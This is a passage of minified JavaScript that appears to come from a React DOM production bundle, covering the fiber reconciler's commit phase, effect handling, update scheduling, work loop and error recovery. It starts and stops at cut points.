19:if(z(F),l=n.memoizedState,l===null)return ie(n),null;if(r=(n.flags&128)!==0,o=l.rendering,o===null)if(r)Et(l,!1);else{if(X!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(o=ii(e),o!==null){for(n.flags|=128,Et(l,!1),r=o.updateQueue,r!==null&&(n.updateQueue=r,n.flags|=4),n.subtreeFlags=0,r=t,t=n.child;t!==null;)l=t,e=r,l.flags&=14680066,o=l.alternate,o===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=o.childLanes,l.lanes=o.lanes,l.child=o.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=o.memoizedProps,l.memoizedState=o.memoizedState,l.updateQueue=o.updateQueue,l.type=o.type,e=o.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return I(F,F.current&1|2),n.child}e=e.sibling}l.tail!==null&&G()>dt&&(n.flags|=128,r=!0,Et(l,!1),n.lanes=4194304)}else{if(!r)if(e=ii(o),e!==null){if(n.flags|=128,r=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Et(l,!0),l.tail===null&&l.tailMode==="hidden"&&!o.alternate&&!B)return ie(n),null}else 2*G()-l.renderingStartTime>dt&&t!==1073741824&&(n.flags|=128,r=!0,Et(l,!1),n.lanes=4194304);l.isBackwards?(o.sibling=n.child,n.child=o):(t=l.last,t!==null?t.sibling=o:n.child=o,l.last=o)}return l.tail!==null?(n=l.tail,l.rendering=n,l.tail=n.sibling,l.renderingStartTime=G(),n.sibling=null,t=F.current,I(F,r?t&1|2:t&1),n):(ie(n),null);case 22:case 23:return $o(),r=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(n.flags|=8192),r&&n.mode&1?ge&1073741824&&(ie(n),n.subtreeFlags&6&&(n.flags|=8192)):ie(n),null;case 24:return null;case 25:return null}throw Error(x(156,n.tag))}function rp(e,n){switch(Co(n),n.tag){case 1:return he(n.type)&&qr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return ut(),z(pe),z(oe),Ao(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Ro(n),null;case 13:if(z(F),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(x(340));st()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return z(F),null;case 4:return ut(),null;case 10:return No(n.type._context),null;case 22:case 23:return $o(),null;case 24:return null;default:return null}}var Pr=!1,le=!1,ip=typeof WeakSet=="function"?WeakSet:Set,C=null;function qn(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(r){V(e,n,r)}else t.current=null}function $l(e,n,t){try{t()}catch(r){V(e,n,r)}}var ea=!1;function lp(e,n){if(_l=Qr,e=xu(),bo(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var r=t.getSelection&&t.getSelection();if(r&&r.rangeCount!==0){t=r.anchorNode;var i=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{t.nodeType,l.nodeType}catch{t=null;break e}var o=0,s=-1,a=-1,c=0,g=0,h=e,m=null;n:for(;;){for(var v;h!==t||i!==0&&h.nodeType!==3||(s=o+i),h!==l||r!==0&&h.nodeType!==3||(a=o+r),h.nodeType===3&&(o+=h.nodeValue.length),(v=h.firstChild)!==null;)m=h,h=v;for(;;){if(h===e)break n;if(m===t&&++c===i&&(s=o),m===l&&++g===r&&(a=o),(v=h.nextSibling)!==null)break;h=m,m=h.parentNode}h=v}t=s===-1||a===-1?null:{start:s,end:a}}else t=null}t=t||{start:0,end:0}}else t=null;for(Nl={focusedElem:e,selectionRange:t},Qr=!1,C=n;C!==null;)if(n=C,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,C=e;else for(;C!==null;){n=C;try{var w=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var k=w.memoizedProps,E=w.memoizedState,f=n.stateNode,d=f.getSnapshotBeforeUpdate(n.elementType===n.type?k:Le(n.type,k),E);f.__reactInternalSnapshotBeforeUpdate=d}break;case 3:var p=n.stateNode.containerInfo;p.nodeType===1?p.textContent="":p.nodeType===9&&p.documentElement&&p.removeChild(p.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(x(163))}}catch(y){V(n,n.return,y)}if(e=n.sibling,e!==null){e.return=n.return,C=e;break}C=n.return}return w=ea,ea=!1,w}function It(e,n,t){var r=n.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&e)===e){var l=i.destroy;i.destroy=void 0,l!==void 0&&$l(n,t,l)}i=i.next}while(i!==r)}}function Si(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var r=t.create;t.destroy=r()}t=t.next}while(t!==n)}}function Gl(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function vc(e){var n=e.alternate;n!==null&&(e.alternate=null,vc(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[ze],delete n[Yt],delete n[jl],delete n[Uf],delete n[Hf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function yc(e){return e.tag===5||e.tag===3||e.tag===4}function na(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||yc(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Ql(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Xr));else if(r!==4&&(e=e.child,e!==null))for(Ql(e,n,t),e=e.sibling;e!==null;)Ql(e,n,t),e=e.sibling}function Kl(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(Kl(e,n,t),e=e.sibling;e!==null;)Kl(e,n,t),e=e.sibling}var ee=null,Oe=!1;function Je(e,n,t){for(t=t.child;t!==null;)wc(e,n,t),t=t.sibling}function wc(e,n,t){if(Be&&typeof Be.onCommitFiberUnmount=="function")try{Be.onCommitFiberUnmount(hi,t)}catch{}switch(t.tag){case 5:le||qn(t,n);case 6:var r=ee,i=Oe;ee=null,Je(e,n,t),ee=r,Oe=i,ee!==null&&(Oe?(e=ee,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):ee.removeChild(t.stateNode));break;case 18:ee!==null&&(Oe?(e=ee,t=t.stateNode,e.nodeType===8?Xi(e.parentNode,t):e.nodeType===1&&Xi(e,t),Wt(e)):Xi(ee,t.stateNode));break;case 4:r=ee,i=Oe,ee=t.stateNode.containerInfo,Oe=!0,Je(e,n,t),ee=r,Oe=i;break;case 0:case 11:case 14:case 15:if(!le&&(r=t.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var l=i,o=l.destroy;l=l.tag,o!==void 0&&(l&2||l&4)&&$l(t,n,o),i=i.next}while(i!==r)}Je(e,n,t);break;case 1:if(!le&&(qn(t,n),r=t.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=t.memoizedProps,r.state=t.memoizedState,r.componentWillUnmount()}catch(s){V(t,n,s)}Je(e,n,t);break;case 21:Je(e,n,t);break;case 22:t.mode&1?(le=(r=le)||t.memoizedState!==null,Je(e,n,t),le=r):Je(e,n,t);break;default:Je(e,n,t)}}function ta(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new ip),n.forEach(function(r){var i=hp.bind(null,e,r);t.has(r)||(t.add(r),r.then(i,i))})}}function Ne(e,n){var t=n.deletions;if(t!==null)for(var r=0;r<t.length;r++){var i=t[r];try{var l=e,o=n,s=o;e:for(;s!==null;){switch(s.tag){case 5:ee=s.stateNode,Oe=!1;break e;case 3:ee=s.stateNode.containerInfo,Oe=!0;break e;case 4:ee=s.stateNode.containerInfo,Oe=!0;break e}s=s.return}if(ee===null)throw Error(x(160));wc(l,o,i),ee=null,Oe=!1;var a=i.alternate;a!==null&&(a.return=null),i.return=null}catch(c){V(i,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)kc(n,e),n=n.sibling}function kc(e,n){var t=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Ne(n,e),Ie(e),r&4){try{It(3,e,e.return),Si(3,e)}catch(k){V(e,e.return,k)}try{It(5,e,e.return)}catch(k){V(e,e.return,k)}}break;case 1:Ne(n,e),Ie(e),r&512&&t!==null&&qn(t,t.return);break;case 5:if(Ne(n,e),Ie(e),r&512&&t!==null&&qn(t,t.return),e.flags&32){var i=e.stateNode;try{Ft(i,"")}catch(k){V(e,e.return,k)}}if(r&4&&(i=e.stateNode,i!=null)){var l=e.memoizedProps,o=t!==null?t.memoizedProps:l,s=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{s==="input"&&l.type==="radio"&&l.name!=null&&Ha(i,l),yl(s,o);var c=yl(s,l);for(o=0;o<a.length;o+=2){var g=a[o],h=a[o+1];g==="style"?Qa(i,h):g==="dangerouslySetInnerHTML"?$a(i,h):g==="children"?Ft(i,h):uo(i,g,h,c)}switch(s){case"input":pl(i,l);break;case"textarea":Va(i,l);break;case"select":var m=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!l.multiple;var v=l.value;v!=null?Zn(i,!!l.multiple,v,!1):m!==!!l.multiple&&(l.defaultValue!=null?Zn(i,!!l.multiple,l.defaultValue,!0):Zn(i,!!l.multiple,l.multiple?[]:"",!1))}i[Yt]=l}catch(k){V(e,e.return,k)}}break;case 6:if(Ne(n,e),Ie(e),r&4){if(e.stateNode===null)throw Error(x(162));i=e.stateNode,l=e.memoizedProps;try{i.nodeValue=l}catch(k){V(e,e.return,k)}}break;case 3:if(Ne(n,e),Ie(e),r&4&&t!==null&&t.memoizedState.isDehydrated)try{Wt(n.containerInfo)}catch(k){V(e,e.return,k)}break;case 4:Ne(n,e),Ie(e);break;case 13:Ne(n,e),Ie(e),i=e.child,i.flags&8192&&(l=i.memoizedState!==null,i.stateNode.isHidden=l,!l||i.alternate!==null&&i.alternate.memoizedState!==null||(Vo=G())),r&4&&ta(e);break;case 22:if(g=t!==null&&t.memoizedState!==null,e.mode&1?(le=(c=le)||g,Ne(n,e),le=c):Ne(n,e),Ie(e),r&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!g&&e.mode&1)for(C=e,g=e.child;g!==null;){for(h=C=g;C!==null;){switch(m=C,v=m.child,m.tag){case 0:case 11:case 14:case 15:It(4,m,m.return);break;case 1:qn(m,m.return);var w=m.stateNode;if(typeof w.componentWillUnmount=="function"){r=m,t=m.return;try{n=r,w.props=n.memoizedProps,w.state=n.memoizedState,w.componentWillUnmount()}catch(k){V(r,t,k)}}break;case 5:qn(m,m.return);break;case 22:if(m.memoizedState!==null){ia(h);continue}}v!==null?(v.return=m,C=v):ia(h)}g=g.sibling}e:for(g=null,h=e;;){if(h.tag===5){if(g===null){g=h;try{i=h.stateNode,c?(l=i.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(s=h.stateNode,a=h.memoizedProps.style,o=a!=null&&a.hasOwnProperty("display")?a.display:null,s.style.display=Ga("display",o))}catch(k){V(e,e.return,k)}}}else if(h.tag===6){if(g===null)try{h.stateNode.nodeValue=c?"":h.memoizedProps}catch(k){V(e,e.return,k)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;g===h&&(g=null),h=h.return}g===h&&(g=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:Ne(n,e),Ie(e),r&4&&ta(e);break;case 21:break;default:Ne(n,e),Ie(e)}}function Ie(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(yc(t)){var r=t;break e}t=t.return}throw Error(x(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(Ft(i,""),r.flags&=-33);var l=na(e);Kl(e,l,i);break;case 3:case 4:var o=r.stateNode.containerInfo,s=na(e);Ql(e,s,o);break;default:throw Error(x(161))}}catch(a){V(e,e.return,a)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function op(e,n,t){C=e,xc(e)}function xc(e,n,t){for(var r=(e.mode&1)!==0;C!==null;){var i=C,l=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||Pr;if(!o){var s=i.alternate,a=s!==null&&s.memoizedState!==null||le;s=Pr;var c=le;if(Pr=o,(le=a)&&!c)for(C=i;C!==null;)o=C,a=o.child,o.tag===22&&o.memoizedState!==null?la(i):a!==null?(a.return=o,C=a):la(i);for(;l!==null;)C=l,xc(l),l=l.sibling;C=i,Pr=s,le=c}ra(e)}else i.subtreeFlags&8772&&l!==null?(l.return=i,C=l):ra(e)}}function ra(e){for(;C!==null;){var n=C;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:le||Si(5,n);break;case 1:var r=n.stateNode;if(n.flags&4&&!le)if(t===null)r.componentDidMount();else{var i=n.elementType===n.type?t.memoizedProps:Le(n.type,t.memoizedProps);r.componentDidUpdate(i,t.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=n.updateQueue;l!==null&&Us(n,l,r);break;case 3:var o=n.updateQueue;if(o!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}Us(n,o,t)}break;case 5:var s=n.stateNode;if(t===null&&n.flags&4){t=s;var a=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&t.focus();break;case"img":a.src&&(t.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var g=c.memoizedState;if(g!==null){var h=g.dehydrated;h!==null&&Wt(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(x(163))}le||n.flags&512&&Gl(n)}catch(m){V(n,n.return,m)}}if(n===e){C=null;break}if(t=n.sibling,t!==null){t.return=n.return,C=t;break}C=n.return}}function ia(e){for(;C!==null;){var n=C;if(n===e){C=null;break}var t=n.sibling;if(t!==null){t.return=n.return,C=t;break}C=n.return}}function la(e){for(;C!==null;){var n=C;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{Si(4,n)}catch(a){V(n,t,a)}break;case 1:var r=n.stateNode;if(typeof r.componentDidMount=="function"){var i=n.return;try{r.componentDidMount()}catch(a){V(n,i,a)}}var l=n.return;try{Gl(n)}catch(a){V(n,l,a)}break;case 5:var o=n.return;try{Gl(n)}catch(a){V(n,o,a)}}}catch(a){V(n,n.return,a)}if(n===e){C=null;break}var s=n.sibling;if(s!==null){s.return=n.return,C=s;break}C=n.return}}var sp=Math.ceil,si=qe.ReactCurrentDispatcher,Uo=qe.ReactCurrentOwner,Ce=qe.ReactCurrentBatchConfig,A=0,Z=null,Q=null,ne=0,ge=0,Jn=wn(0),X=0,nr=null,Mn=0,bi=0,Ho=0,Dt=null,de=null,Vo=0,dt=1/0,He=null,ai=!1,Yl=null,fn=null,_r=!1,ln=null,ui=0,zt=0,Xl=null,Br=-1,Fr=0;function ae(){return A&6?G():Br!==-1?Br:Br=G()}function pn(e){return e.mode&1?A&2&&ne!==0?ne&-ne:Wf.transition!==null?(Fr===0&&(Fr=lu()),Fr):(e=M,e!==0||(e=window.event,e=e===void 0?16:fu(e.type)),e):1}function Ae(e,n,t,r){if(50<zt)throw zt=0,Xl=null,Error(x(185));lr(e,t,r),(!(A&2)||e!==Z)&&(e===Z&&(!(A&2)&&(bi|=t),X===4&&tn(e,ne)),me(e,r),t===1&&A===0&&!(n.mode&1)&&(dt=G()+500,wi&&kn()))}function me(e,n){var t=e.callbackNode;Vd(e,n);var r=Gr(e,e===Z?ne:0);if(r===0)t!==null&&hs(t),e.callbackNode=null,e.callbackPriority=0;else if(n=r&-r,e.callbackPriority!==n){if(t!=null&&hs(t),n===1)e.tag===0?Vf(oa.bind(null,e)):Ou(oa.bind(null,e)),Bf(function(){!(A&6)&&kn()}),t=null;else{switch(ou(r)){case 1:t=mo;break;case 4:t=ru;break;case 16:t=$r;break;case 536870912:t=iu;break;default:t=$r}t=Nc(t,Sc.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function Sc(e,n){if(Br=-1,Fr=0,A&6)throw Error(x(327));var t=e.callbackNode;if(it()&&e.callbackNode!==t)return null;var r=Gr(e,e===Z?ne:0);if(r===0)return null;if(r&30||r&e.expiredLanes||n)n=ci(e,r);else{n=r;var i=A;A|=2;var l=Ec();(Z!==e||ne!==n)&&(He=null,dt=G()+500,Ln(e,n));do try{cp();break}catch(s){bc(e,s)}while(!0);_o(),si.current=l,A=i,Q!==null?n=0:(Z=null,ne=0,n=X)}if(n!==0){if(n===2&&(i=bl(e),i!==0&&(r=i,n=ql(e,i))),n===1)throw t=nr,Ln(e,0),tn(e,r),me(e,G()),t;if(n===6)tn(e,r);else{if(i=e.current.alternate,!(r&30)&&!ap(i)&&(n=ci(e,r),n===2&&(l=bl(e),l!==0&&(r=l,n=ql(e,l))),n===1))throw t=nr,Ln(e,0),tn(e,r),me(e,G()),t;switch(e.finishedWork=i,e.finishedLanes=r,n){case 0:case 1:throw Error(x(345));case 2:Cn(e,de,He);break;case 3:if(tn(e,r),(r&130023424)===r&&(n=Vo+500-G(),10<n)){if(Gr(e,0)!==0)break;if(i=e.suspendedLanes,(i&r)!==r){ae(),e.pingedLanes|=e.suspendedLanes&i;break}e.timeoutHandle=Ol(Cn.bind(null,e,de,He),n);break}Cn(e,de,He);break;case 4:if(tn(e,r),(r&4194240)===r)break;for(n=e.eventTimes,i=-1;0<r;){var o=31-Re(r);l=1<<o,o=n[o],o>i&&(i=o),r&=~l}if(r=i,r=G()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*sp(r/1960))-r,10<r){e.timeoutHandle=Ol(Cn.bind(null,e,de,He),r);break}Cn(e,de,He);break;case 5:Cn(e,de,He);break;default:throw Error(x(329))}}}return me(e,G()),e.callbackNode===t?Sc.bind(null,e):null}function ql(e,n){var t=Dt;return e.current.memoizedState.isDehydrated&&(Ln(e,n).flags|=256),e=ci(e,n),e!==2&&(n=de,de=t,n!==null&&Jl(n)),e}function Jl(e){de===null?de=e:de.push.apply(de,e)}function ap(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var r=0;r<t.length;r++){var i=t[r],l=i.getSnapshot;i=i.value;try{if(!Me(l(),i))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function tn(e,n){for(n&=~Ho,n&=~bi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Re(n),r=1<<t;e[t]=-1,n&=~r}}function oa(e){if(A&6)throw Error(x(327));it();var n=Gr(e,0);if(!(n&1))return me(e,G()),null;var t=ci(e,n);if(e.tag!==0&&t===2){var r=bl(e);r!==0&&(n=r,t=ql(e,r))}if(t===1)throw t=nr,Ln(e,0),tn(e,n),me(e,G()),t;if(t===6)throw Error(x(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Cn(e,de,He),me(e,G()),null}function Wo(e,n){var t=A;A|=1;try{return e(n)}finally{A=t,A===0&&(dt=G()+500,wi&&kn())}}function In(e){ln!==null&&ln.tag===0&&!(A&6)&&it();var n=A;A|=1;var t=Ce.transition,r=M;try{if(Ce.transition=null,M=1,e)return e()}finally{M=r,Ce.transition=t,A=n,!(A&6)&&kn()}}function $o(){ge=Jn.current,z(Jn)}function Ln(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,zf(t)),Q!==null)for(t=Q.return;t!==null;){var r=t;switch(Co(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&qr();break;case 3:ut(),z(pe),z(oe),Ao();break;case 5:Ro(r);break;case 4:ut();break;case 13:z(F);break;case 19:z(F);break;case 10:No(r.type._context);break;case 22:case 23:$o()}t=t.return}if(Z=e,Q=e=hn(e.current,null),ne=ge=n,X=0,nr=null,Ho=bi=Mn=0,de=Dt=null,_n!==null){for(n=0;n<_n.length;n++)if(t=_n[n],r=t.interleaved,r!==null){t.interleaved=null;var i=r.next,l=t.pending;if(l!==null){var o=l.next;l.next=i,r.next=o}t.pending=r}_n=null}return e}function bc(e,n){do{var t=Q;try{if(_o(),Ir.current=oi,li){for(var r=U.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}li=!1}if(An=0,J=Y=U=null,Mt=!1,Jt=0,Uo.current=null,t===null||t.return===null){X=1,nr=n,Q=null;break}e:{var l=e,o=t.return,s=t,a=n;if(n=ne,s.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var c=a,g=s,h=g.tag;if(!(g.mode&1)&&(h===0||h===11||h===15)){var m=g.alternate;m?(g.updateQueue=m.updateQueue,g.memoizedState=m.memoizedState,g.lanes=m.lanes):(g.updateQueue=null,g.memoizedState=null)}var v=Qs(o);if(v!==null){v.flags&=-257,Ks(v,o,s,l,n),v.mode&1&&Gs(l,c,n),n=v,a=c;var w=n.updateQueue;if(w===null){var k=new Set;k.add(a),n.updateQueue=k}else w.add(a);break e}else{if(!(n&1)){Gs(l,c,n),Go();break e}a=Error(x(426))}}else if(B&&s.mode&1){var E=Qs(o);if(E!==null){!(E.flags&65536)&&(E.flags|=256),Ks(E,o,s,l,n),To(ct(a,s));break e}}l=a=ct(a,s),X!==4&&(X=2),Dt===null?Dt=[l]:Dt.push(l),l=o;do{switch(l.tag){case 3:l.flags|=65536,n&=-n,l.lanes|=n;var f=oc(l,a,n);Fs(l,f);break e;case 1:s=a;var d=l.type,p=l.stateNode;if(!(l.flags&128)&&(typeof d.getDerivedStateFromError=="function"||p!==null&&typeof p.componentDidCatch=="function"&&(fn===null||!fn.has(p)))){l.flags|=65536,n&=-n,l.lanes|=n;var y=sc(l,s,n);Fs(l,y);break e}}l=l.return}while(l!==null)}Tc(t)}catch(b){n=b,Q===t&&t!==null&&(Q=t=t.return);continue}break}while(!0)}function Ec(){var e=si.current;return si.current=oi,e===null?oi:e}function Go(){(X===0||X===3||X===2)&&(X=4),Z===null||!(Mn&268435455)&&!(bi&268435455)||tn(Z,ne)}function ci(e,n){var t=A;A|=2;var r=Ec();(Z!==e||ne!==n)&&(He=null,Ln(e,n));do try{up();break}catch(i){bc(e,i)}while(!0);if(_o(),A=t,si.current=r,Q!==null)throw Error(x(261));return Z=null,ne=0,X}function up(){for(;Q!==null;)Cc(Q)}function cp(){for(;Q!==null&&!Ad();)Cc(Q)}function Cc(e){var n=_c(e.alternate,e,ge);e.memoizedProps=e.pendingProps,n===null?Tc(e):Q=n,Uo.current=null}function Tc(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=rp(t,n),t!==null){t.flags&=32767,Q=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{X=6,Q=null;return}}else if(t=tp(t,n,ge),t!==null){Q=t;return}if(n=n.sibling,n!==null){Q=n;return}Q=n=e}while(n!==null);X===0&&(X=5)}function Cn(e,n,t){var r=M,i=Ce.transition;try{Ce.transition=null,M=1,dp(e,n,t,r)}finally{Ce.transition=i,M=r}return null}function dp(e,n,t,r){do it();while(ln!==null);if(A&6)throw Error(x(327));t=e.finishedWork;var i=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(x(177));e.callbackNode=null,e.callbackPriority=0;var l=t.lanes|t.childLanes;if(Wd(e,l),e===Z&&(Q=Z=null,ne=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||_r||(_r=!0,Nc($r,function(){return it(),null})),l=(t.flags&15990)!==0,t.subtreeFlags&15990||l){l=Ce.transition,Ce.transition=null;var o=M;M=1;var s=A;A|=4,Uo.current=null,lp(e,t),kc(t,e),Of(Nl),Qr=!!_l,Nl=_l=null,e.current=t,op(t),Md(),A=s,M=o,Ce.transition=l}else e.current=t;if(_r&&(_r=!1,ln=e,ui=i),l=e.pendingLanes,l===0&&(fn=null),zd(t.stateNode),me(e,G()),n!==null)for(r=e.onRecoverableError,t=0;t<n.length;t++)i=n[t],r(i.value,{componentStack:i.stack,digest:i.digest});if(ai)throw ai=!1,e=Yl,Yl=null,e;return ui&1&&e.tag!==0&&it(),l=e.pendingLanes,l&1?e===Xl?zt++:(zt=0,Xl=e):zt=0,kn(),null}function it(){if(ln!==null){var e=ou(ui),n=Ce.transition,t=M;try{if(Ce.transition=null,M=16>e?16:e,ln===null)var r=!1;else{if(e=ln,ln=null,ui=0,A&6)throw Error(x(331));var i=A;for(A|=4,C=e.current;C!==null;){var l=C,o=l.child;if(C.flags&16){var s=l.deletions;if(s!==null){for(var a=0;a<s.length;a++){var c=s[a];for(C=c;C!==null;){var g=C;switch(g.tag){case 0:case 11:case 15:It(8,g,l)}var h=g.child;if(h!==null)h.return=g,C=h;else for(;C!==null;){g=C;var m=g.sibling,v=g.return;if(vc(g),g===c){C=null;break}if(m!==null){m.return=v,C=m;break}C=v}}}var w=l.alternate;if(w!==null){var k=w.child;if(k!==null){w.child=null;do{var E=k.sibling;k.sibling=null,k=E}while(k!==null)}}C=l}}if(l.subtreeFlags&2064&&o!==null)o.return=l,C=o;else e:for(;C!==null;){if(l=C,l.flags&2048)switch(l.tag){case 0:case 11:case 15:It(9,l,l.return)}var f=l.sibling;if(f!==null){f.return=l.return,C=f;break e}C=l.return}}var d=e.current;for(C=d;C!==null;){o=C;var p=o.child;if(o.subtreeFlags&2064&&p!==null)p.return=o,C=p;else e:for(o=d;C!==null;){if(s=C,s.flags&2048)try{switch(s.tag){case 0:case 11:case 15:Si(9,s)}}catch(b){V(s,s.return,b)}if(s===o){C=null;break e}var y=s.sibling;if(y!==null){y.return=s.return,C=y;break e}C=s.return}}if(A=i,kn(),Be&&typeof Be.onPostCommitFiberRoot=="function")try{Be.onPostCommitFiberRoot(hi,e)}catch{}r=!0}return r}finally{M=t,Ce.transition=n}}return!1}function sa(e,n,t){n=ct(t,n),n=oc(e,n,1),e=dn(e,n,1),n=ae(),e!==null&&(lr(e,1,n),me(e,n))}function V(e,n,t){if(e.tag===3)sa(e,e,t);else for(;n!==null;){if(n.tag===3){sa(n,e,t);break}else if(n.tag===1){var r=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(fn===null||!fn.has(r))){e=ct(t,e),e=sc(n,e,1),n=dn(n,e,1),e=ae(),n!==null&&(lr(n,1,e),me(n,e));break}}n=n.return}}function fp(e,n,t){var r=e.pingCache;r!==null&&r.delete(n),n=ae(),e.pingedLanes|=e.suspendedLanes&t,Z===e&&(ne&t)===t&&(X===4||X===3&&(ne&130023424)===ne&&500>G()-Vo?Ln(e,0):Ho|=t),me(e,n)}function Pc(e,n){n===0&&(e.mode&1?(n=yr,yr<<=1,!(yr&130023424)&&(yr=4194304)):n=1);var t=ae();e=Ye(e,n),e!==null&&(lr(e,n,t),me(e,t))}function pp(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),Pc(e,t)}function hp(e,n){var t=0;switch(e.tag){case 13:var r=e.stateNode,i=e.memoizedState;i!==null&&(t=i.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(x(314))}r!==null&&r.delete(n),Pc(e,t)}var _c;_c=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||pe.current)fe=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return fe=!1,np(e,n,t);fe=!!(e.flags&131072)}else fe=!1,B&&n.flags&1048576&&ju(n,ei,n.index);switch(n.lanes=0,n.tag){case 2:var r=n.type;zr(e,n),e=n.pendingProps;var i=ot(n,oe.current);rt(n,t),i=Io(null,n,r,e,i,t);var l=Do();return n.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,he(r)?(l=!0,Jr(n)):l=!1,n.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,Oo(n),i.updater=xi,n.stateNode=i,i._reactInternals=n,zl(n,r,e,t),n=Ul(null,n,r,!0,l,t)):(n.tag=0,B&&l&&Eo(n),se(null,n,i,t),n=n.child),n;case 16:r=n.elementType;e:{switch(zr(e,n),e=n.pendingProps,i=r._init,r=i(r._payload),n.type=r,i=n.tag=gp(r),e=Le(r,e),i){case 0:n=Fl(null,n,r,e,t);break e;case 1:n=qs(null,n,r,e,t);break e;case 11:n=Ys(null,n,r,e,t);break e;case 